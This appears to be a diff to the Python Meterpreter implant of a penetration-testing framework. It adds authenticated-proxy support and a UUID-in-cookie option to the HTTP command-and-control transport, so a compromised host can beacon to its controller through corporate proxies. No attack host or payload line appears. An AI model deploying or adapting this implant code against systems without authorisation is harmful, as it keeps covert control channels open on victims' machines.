@@ -23,7 +23,7 @@ else:
     has_windll = hasattr(ctypes, 'windll')
 
 try:
-    urllib_imports = ['ProxyBasicAuthHandler', 'ProxyHandler', 'HTTPSHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
+    urllib_imports = ['HTTPPasswordMgrWithDefaultRealm', 'ProxyBasicAuthHandler', 'ProxyHandler', 'HTTPSHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
     if sys.version_info[0] < 3:
         urllib = __import__('urllib2', fromlist=urllib_imports)
     else:
@@ -933,6 +933,7 @@ class Transport(object):
         opts['suffix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_SUFFIX).get('value')
         opts['uuid_get'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_GET).get('value')
         opts['uuid_header'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_HEADER).get('value')
+        opts['uuid_cookie'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UUID_COOKIE).get('value')
         return opts
 
     @staticmethod
@@ -942,9 +943,12 @@ class Transport(object):
             transport = TcpTransport(url)
         elif url.startswith('http'):
             proxy = packet_get_tlv(request, TLV_TYPE_C2_PROXY_URL).get('value')
+            proxy_user = packet_get_tlv(request, TLV_TYPE_C2_PROXY_USER).get('value')
+            proxy_pass = packet_get_tlv(request, TLV_TYPE_C2_PROXY_PASS).get('value')
             user_agent = packet_get_tlv(request, TLV_TYPE_C2_UA).get('value')
             http_headers = packet_get_tlv(request, TLV_TYPE_C2_HEADERS).get('value', None)
-            transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
+            transport = HttpTransport(url, proxy=proxy, proxy_user=proxy_user, proxy_pass=proxy_pass,
+                    user_agent=user_agent)
             if http_headers:
                 headers = {}
                 for h in http_headers.strip().split("\r\n"):
@@ -953,7 +957,8 @@ class Transport(object):
                 http_host = headers.get('HOST')
                 http_cookie = headers.get('COOKIE')
                 http_referer = headers.get('REFERER')
-                transport = HttpTransport(url, proxy=proxy, user_agent=user_agent, http_host=http_host,
+                transport = HttpTransport(url, proxy=proxy, proxy_user=proxy_user, proxy_pass=proxy_pass,
+                        user_agent=user_agent, http_host=http_host,
                         http_cookie=http_cookie, http_referer=http_referer)
             # Parse C2 profile GET/POST sub-groups if present
             get_group = packet_get_tlv(request, TLV_TYPE_C2_GET)
@@ -1065,7 +1070,8 @@ class Transport(object):
         return trans_group
 
 class HttpTransport(Transport):
-    def __init__(self, url, proxy=None, user_agent=None, http_host=None, http_referer=None, http_cookie=None):
+    def __init__(self, url, proxy=None, proxy_user=None, proxy_pass=None,
+            user_agent=None, http_host=None, http_referer=None, http_cookie=None):
         super(HttpTransport, self).__init__()
         opener_args = []
         scheme = url.split(':', 1)[0]
@@ -1077,8 +1083,15 @@ class HttpTransport(Transport):
             opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
         if proxy:
             opener_args.append(urllib.ProxyHandler({scheme: proxy}))
-            opener_args.append(urllib.ProxyBasicAuthHandler())
+            if proxy_user is not None and proxy_pass is not None:
+                pw_mgr = urllib.HTTPPasswordMgrWithDefaultRealm()
+                pw_mgr.add_password(None, proxy, proxy_user, proxy_pass)
+                opener_args.append(urllib.ProxyBasicAuthHandler(pw_mgr))
+            else:
+                opener_args.append(urllib.ProxyBasicAuthHandler())
         self.proxy = proxy
+        self.proxy_user = proxy_user
+        self.proxy_pass = proxy_pass
         opener = urllib.build_opener(*opener_args)
         opener.addheaders = []
         if user_agent:
@@ -1143,6 +1156,10 @@ class HttpTransport(Transport):
             headers['User-Agent'] = c2_opts['ua']
         if uuid and c2_opts.get('uuid_header'):
             headers[c2_opts['uuid_header']] = uuid
+        if uuid and c2_opts.get('uuid_cookie'):
+            cookie_val = c2_opts['uuid_cookie'] + '=' + uuid
+            existing = headers.get('Cookie')
+            headers['Cookie'] = existing + '; ' + cookie_val if existing else cookie_val
         return headers
 
     def _get_uuid(self):
